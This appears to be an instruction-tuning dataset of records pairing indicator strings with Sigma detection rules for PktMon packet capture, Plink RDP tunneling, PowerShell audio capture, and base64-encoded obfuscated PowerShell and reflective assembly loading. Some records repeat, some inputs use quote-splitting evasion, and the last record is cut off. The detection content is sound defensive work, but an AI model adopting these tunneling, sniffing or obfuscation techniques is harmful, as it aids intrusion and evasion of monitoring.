{"instruction": "Write Sigma rule to detect payload:", "input": "\\pktmon.exe PktMon.exe", "output": "title: PktMon.EXE Execution\nid: f956c7c1-0f60-4bc5-b7d7-b39ab3c08908\nstatus: test\ndescription: Detects execution of PktMon, a tool that captures network packets.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pktmon/\nauthor: frack113\ndate: 2022-03-17\nmodified: 2023-06-23\ntags:\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\pktmon.exe'\n        - OriginalFileName: 'PktMon.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pktmon.exe PktMo\"n.exe\"", "output": "title: PktMon.EXE Execution\nid: f956c7c1-0f60-4bc5-b7d7-b39ab3c08908\nstatus: test\ndescription: Detects execution of PktMon, a tool that captures network packets.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pktmon/\nauthor: frack113\ndate: 2022-03-17\nmodified: 2023-06-23\ntags:\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\pktmon.exe'\n        - OriginalFileName: 'PktMon.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pktmon PktMon", "output": "title: PktMon.EXE Execution\nid: f956c7c1-0f60-4bc5-b7d7-b39ab3c08908\nstatus: test\ndescription: Detects execution of PktMon, a tool that captures network packets.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pktmon/\nauthor: frack113\ndate: 2022-03-17\nmodified: 2023-06-23\ntags:\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\pktmon.exe'\n        - OriginalFileName: 'PktMon.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pktmon.exe PktMon.exe", "output": "title: PktMon.EXE Execution\nid: f956c7c1-0f60-4bc5-b7d7-b39ab3c08908\nstatus: test\ndescription: Detects execution of PktMon, a tool that captures network packets.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pktmon/\nauthor: frack113\ndate: 2022-03-17\nmodified: 2023-06-23\ntags:\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\pktmon.exe'\n        - OriginalFileName: 'PktMon.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-R", "output": "title: Suspicious Plink Port Forwarding\nid: 48a61b29-389f-4032-b317-b30de6b95314\nstatus: test\ndescription: Detects suspicious Plink tunnel port forwarding to a local port\nreferences:\n    - https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/\n    - https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-19\nmodified: 2022-10-09\ntags:\n    - attack.command-and-control\n    - attack.t1572\n    - attack.lateral-movement\n    - attack.t1021.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description: 'Command-line SSH, Telnet, and Rlogin client'\n        CommandLine|contains: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-R", "output": "title: Suspicious Plink Port Forwarding\nid: 48a61b29-389f-4032-b317-b30de6b95314\nstatus: test\ndescription: Detects suspicious Plink tunnel port forwarding to a local port\nreferences:\n    - https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/\n    - https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-19\nmodified: 2022-10-09\ntags:\n    - attack.command-and-control\n    - attack.t1572\n    - attack.lateral-movement\n    - attack.t1021.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description: 'Command-line SSH, Telnet, and Rlogin client'\n        CommandLine|contains: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-R", "output": "title: Suspicious Plink Port Forwarding\nid: 48a61b29-389f-4032-b317-b30de6b95314\nstatus: test\ndescription: Detects suspicious Plink tunnel port forwarding to a local port\nreferences:\n    - https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/\n    - https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-01-19\nmodified: 2022-10-09\ntags:\n    - attack.command-and-control\n    - attack.t1572\n    - attack.lateral-movement\n    - attack.t1021.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description: 'Command-line SSH, Telnet, and Rlogin client'\n        CommandLine|contains: ' -R '\n    condition: selection\nfalsepositives:\n    - Administrative activity using a remote port forwarding to a local port\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\plink.exe :127.0.0.1:3389 \\plink.exe :3389 -P 443 -P 22", "output": "title: Potential RDP Tunneling Via Plink\nid: f38ce0b9-5e97-4b47-a211-7dc8d8b871da\nrelated:\n    - id: f7d7ebd5-a016-46e2-9c54-f9932f2d386d # ssh.exe\n      type: similar\nstatus: test\ndescription: Execution of plink to perform data exfiltration and tunneling\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-04\nmodified: 2023-01-27\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_a:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':127.0.0.1:3389'\n    selection_b1:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':3389'\n    selection_b2:\n        CommandLine|contains:\n            - ' -P 443'\n            - ' -P 22'\n    condition: selection_a or all of selection_b*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\plink.exe :127.0.0.1:3389 \\plink.exe :3389 -P \\\"443\\\" \\\"-P\\\" 22", "output": "title: Potential RDP Tunneling Via Plink\nid: f38ce0b9-5e97-4b47-a211-7dc8d8b871da\nrelated:\n    - id: f7d7ebd5-a016-46e2-9c54-f9932f2d386d # ssh.exe\n      type: similar\nstatus: test\ndescription: Execution of plink to perform data exfiltration and tunneling\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-04\nmodified: 2023-01-27\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_a:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':127.0.0.1:3389'\n    selection_b1:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':3389'\n    selection_b2:\n        CommandLine|contains:\n            - ' -P 443'\n            - ' -P 22'\n    condition: selection_a or all of selection_b*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\plink :127.0.0.1:3389 \\plink :3389 -P 443 -P 22", "output": "title: Potential RDP Tunneling Via Plink\nid: f38ce0b9-5e97-4b47-a211-7dc8d8b871da\nrelated:\n    - id: f7d7ebd5-a016-46e2-9c54-f9932f2d386d # ssh.exe\n      type: similar\nstatus: test\ndescription: Execution of plink to perform data exfiltration and tunneling\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-04\nmodified: 2023-01-27\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_a:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':127.0.0.1:3389'\n    selection_b1:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':3389'\n    selection_b2:\n        CommandLine|contains:\n            - ' -P 443'\n            - ' -P 22'\n    condition: selection_a or all of selection_b*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\plink.exe :127.0.0.1:3389 \\plink.exe :3389 -P 443 -P 22", "output": "title: Potential RDP Tunneling Via Plink\nid: f38ce0b9-5e97-4b47-a211-7dc8d8b871da\nrelated:\n    - id: f7d7ebd5-a016-46e2-9c54-f9932f2d386d # ssh.exe\n      type: similar\nstatus: test\ndescription: Execution of plink to perform data exfiltration and tunneling\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-04\nmodified: 2023-01-27\ntags:\n    - attack.command-and-control\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_a:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':127.0.0.1:3389'\n    selection_b1:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':3389'\n    selection_b2:\n        CommandLine|contains:\n            - ' -P 443'\n            - ' -P 22'\n    condition: selection_a or all of selection_b*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "WindowsAudioDevice-Powershell-Cmdlet Toggle-AudioDevice Get-AudioDevice Set-AudioDevice Write-AudioDevice", "output": "title: Audio Capture via PowerShell\nid: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6\nstatus: test\ndescription: Detects audio capture via PowerShell Cmdlet.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html\n    - https://github.com/frgnca/AudioDeviceCmdlets\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-04-06\ntags:\n    - attack.collection\n    - attack.t1123\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'WindowsAudioDevice-Powershell-Cmdlet'\n            - 'Toggle-AudioDevice'\n            - 'Get-AudioDevice '\n            - 'Set-AudioDevice '\n            - 'Write-AudioDevice '\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "WindowsAudioDevice-Powershell-Cmdlet Toggle-Au\"dioDevice\" Get-AudioDevice Set-AudioDevice Write-AudioDevice", "output": "title: Audio Capture via PowerShell\nid: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6\nstatus: test\ndescription: Detects audio capture via PowerShell Cmdlet.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html\n    - https://github.com/frgnca/AudioDeviceCmdlets\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-04-06\ntags:\n    - attack.collection\n    - attack.t1123\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'WindowsAudioDevice-Powershell-Cmdlet'\n            - 'Toggle-AudioDevice'\n            - 'Get-AudioDevice '\n            - 'Set-AudioDevice '\n            - 'Write-AudioDevice '\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "WindowsAudioDevice-Powershell-Cmdlet Toggle-AudioDevice Get-AudioDevice Set-AudioDevice Write-AudioDevice", "output": "title: Audio Capture via PowerShell\nid: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6\nstatus: test\ndescription: Detects audio capture via PowerShell Cmdlet.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1123/T1123.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/ab7a6ef4-0983-4275-a4f1-5c6bd3c31c23.html\n    - https://github.com/frgnca/AudioDeviceCmdlets\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-04-06\ntags:\n    - attack.collection\n    - attack.t1123\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'WindowsAudioDevice-Powershell-Cmdlet'\n            - 'Toggle-AudioDevice'\n            - 'Get-AudioDevice '\n            - 'Set-AudioDevice '\n            - 'Write-AudioDevice '\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "IAAtAGIAeABvAHIAIAAwAHgA AALQBiAHgAbwByACAAMAB4A gAC0AYgB4AG8AcgAgADAAeA AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg AuAEkAbgB2AG8AawBlACgAKQAgAHwAI ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC AHsAMQB9AHsAMAB9ACIAIAAtAGYAI B7ADEAfQB7ADAAfQAiACAALQBmAC AewAxAH0AewAwAH0AIgAgAC0AZgAg AHsAMAB9AHsAMwB9ACIAIAAtAGYAI B7ADAAfQB7ADMAfQAiACAALQBmAC AewAwAH0AewAzAH0AIgAgAC0AZgAg AHsAMgB9AHsAMAB9ACIAIAAtAGYAI B7ADIAfQB7ADAAfQAiACAALQBmAC AewAyAH0AewAwAH0AIgAgAC0AZgAg AHsAMQB9AHsAMAB9ACcAIAAtAGYAI B7ADEAfQB7ADAAfQAnACAALQBmAC AewAxAH0AewAwAH0AJwAgAC0AZgAg AHsAMAB9AHsAMwB9ACcAIAAtAGYAI B7ADAAfQB7ADMAfQAnACAALQBmAC AewAwAH0AewAzAH0AJwAgAC0AZgAg AHsAMgB9AHsAMAB9ACcAIAAtAGYAI B7ADIAfQB7ADAAfQAnACAALQBmAC AewAyAH0AewAwAH0AJwAgAC0AZgAg", "output": "title: Suspicious Obfuscated PowerShell Code\nid: 8d01b53f-456f-48ee-90f6-bc28e67d4e35\nstatus: test\ndescription: Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines\nreferences:\n    - https://app.any.run/tasks/fcadca91-3580-4ede-aff4-4d2bf809bf99/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-07-11\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            #  -bxor 0x\n            - 'IAAtAGIAeABvAHIAIAAwAHgA'\n            - 'AALQBiAHgAbwByACAAMAB4A'\n            - 'gAC0AYgB4AG8AcgAgADAAeA'\n            # .Invoke() |\n            - 'AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg'\n            - 'AuAEkAbgB2AG8AawBlACgAKQAgAHwAI'\n            - 'ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC'\n            # {1}{0}\" -f\n            # {0}{3}\" -f\n            # {2}{0}\" -f\n            - 'AHsAMQB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AIgAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACIAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAiACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AIgAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AIgAgAC0AZgAg'\n            # {1}{0}' -f\n            # {0}{3}' -f\n            # {2}{0}' -f\n            - 'AHsAMQB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AJwAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACcAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAnACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AJwAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AJwAgAC0AZgAg'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "IAAtAGIAeABvAHIAIAAwAHgA AALQBiAHgAbwByACAAMAB4A gAC0AYgB4AG8AcgAgADAAeA AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg AuAEkAbgB2AG8AawBlACgAKQAgAHwAI ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC AHsAMQB9AHsAMAB9ACIAIAAtAGYAI B7ADEAfQB7ADAAfQAiACAALQBmAC AewAxAH0AewAwAH0AIgAgAC0AZgAg AHsAMAB9AHsAMwB9ACIAIAAtAGYAI B7ADAAfQB7ADMAfQAiACAALQBmAC AewAwAH0AewAzAH0AIgAgAC0AZgAg AHsAMgB9AHsAMAB9ACIAIAAtAGYAI B7ADIAfQB7ADAAfQAiACAALQBmAC AewAyAH0AewAwAH0AIgAgAC0AZgAg AHsAMQB9AHsAMAB9ACcAIAAtAGYAI \\\"B7ADEAfQB7ADAAfQAnACAALQBmAC\\\" \\\"AewAxAH0AewAwAH0AJwAgAC0AZgAg\\\" AHsAMAB9AHsAMwB9ACcAIAAtAGYAI B7ADAAfQB7ADMAfQAnACAALQBmAC AewAwAH0AewAzAH0AJwAgAC0AZgAg AHsAMgB9AHsAMAB9ACcAIAAtAGYAI B7ADIAfQB7ADAAfQAnACAALQBmAC AewAyAH0AewAwAH0AJwAgAC0AZgAg", "output": "title: Suspicious Obfuscated PowerShell Code\nid: 8d01b53f-456f-48ee-90f6-bc28e67d4e35\nstatus: test\ndescription: Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines\nreferences:\n    - https://app.any.run/tasks/fcadca91-3580-4ede-aff4-4d2bf809bf99/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-07-11\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            #  -bxor 0x\n            - 'IAAtAGIAeABvAHIAIAAwAHgA'\n            - 'AALQBiAHgAbwByACAAMAB4A'\n            - 'gAC0AYgB4AG8AcgAgADAAeA'\n            # .Invoke() |\n            - 'AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg'\n            - 'AuAEkAbgB2AG8AawBlACgAKQAgAHwAI'\n            - 'ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC'\n            # {1}{0}\" -f\n            # {0}{3}\" -f\n            # {2}{0}\" -f\n            - 'AHsAMQB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AIgAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACIAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAiACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AIgAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AIgAgAC0AZgAg'\n            # {1}{0}' -f\n            # {0}{3}' -f\n            # {2}{0}' -f\n            - 'AHsAMQB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AJwAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACcAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAnACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AJwAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AJwAgAC0AZgAg'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "IAAtAGIAeABvAHIAIAAwAHgA AALQBiAHgAbwByACAAMAB4A gAC0AYgB4AG8AcgAgADAAeA AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg AuAEkAbgB2AG8AawBlACgAKQAgAHwAI ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC AHsAMQB9AHsAMAB9ACIAIAAtAGYAI B7ADEAfQB7ADAAfQAiACAALQBmAC AewAxAH0AewAwAH0AIgAgAC0AZgAg AHsAMAB9AHsAMwB9ACIAIAAtAGYAI B7ADAAfQB7ADMAfQAiACAALQBmAC AewAwAH0AewAzAH0AIgAgAC0AZgAg AHsAMgB9AHsAMAB9ACIAIAAtAGYAI B7ADIAfQB7ADAAfQAiACAALQBmAC AewAyAH0AewAwAH0AIgAgAC0AZgAg AHsAMQB9AHsAMAB9ACcAIAAtAGYAI B7ADEAfQB7ADAAfQAnACAALQBmAC AewAxAH0AewAwAH0AJwAgAC0AZgAg AHsAMAB9AHsAMwB9ACcAIAAtAGYAI B7ADAAfQB7ADMAfQAnACAALQBmAC AewAwAH0AewAzAH0AJwAgAC0AZgAg AHsAMgB9AHsAMAB9ACcAIAAtAGYAI B7ADIAfQB7ADAAfQAnACAALQBmAC AewAyAH0AewAwAH0AJwAgAC0AZgAg", "output": "title: Suspicious Obfuscated PowerShell Code\nid: 8d01b53f-456f-48ee-90f6-bc28e67d4e35\nstatus: test\ndescription: Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines\nreferences:\n    - https://app.any.run/tasks/fcadca91-3580-4ede-aff4-4d2bf809bf99/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-07-11\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            #  -bxor 0x\n            - 'IAAtAGIAeABvAHIAIAAwAHgA'\n            - 'AALQBiAHgAbwByACAAMAB4A'\n            - 'gAC0AYgB4AG8AcgAgADAAeA'\n            # .Invoke() |\n            - 'AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg'\n            - 'AuAEkAbgB2AG8AawBlACgAKQAgAHwAI'\n            - 'ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC'\n            # {1}{0}\" -f\n            # {0}{3}\" -f\n            # {2}{0}\" -f\n            - 'AHsAMQB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AIgAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACIAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAiACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AIgAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACIAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAiACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AIgAgAC0AZgAg'\n            # {1}{0}' -f\n            # {0}{3}' -f\n            # {2}{0}' -f\n            - 'AHsAMQB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADEAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAxAH0AewAwAH0AJwAgAC0AZgAg'\n            - 'AHsAMAB9AHsAMwB9ACcAIAAtAGYAI'\n            - 'B7ADAAfQB7ADMAfQAnACAALQBmAC'\n            - 'AewAwAH0AewAzAH0AJwAgAC0AZgAg'\n            - 'AHsAMgB9AHsAMAB9ACcAIAAtAGYAI'\n            - 'B7ADIAfQB7ADAAfQAnACAALQBmAC'\n            - 'AewAyAH0AewAwAH0AJwAgAC0AZgAg'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA", "output": "title: PowerShell Base64 Encoded Reflective Assembly Load\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nrelated:\n    - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n      type: similar\nstatus: test\ndescription: Detects base64 encoded .NET reflective loading of Assembly\nreferences:\n    - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nauthor: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022-03-01\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.t1620\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # [Reflection.Assembly]::Load(\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n            # [reflection.assembly]::(\"Load\")\n            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'\n            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'\n            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'\n            # [Reflection.Assembly]::(\"Load\")\n            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'\n            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'\n            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'\n            # [reflection.assembly]::Load(\n            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'\n            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'\n            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - 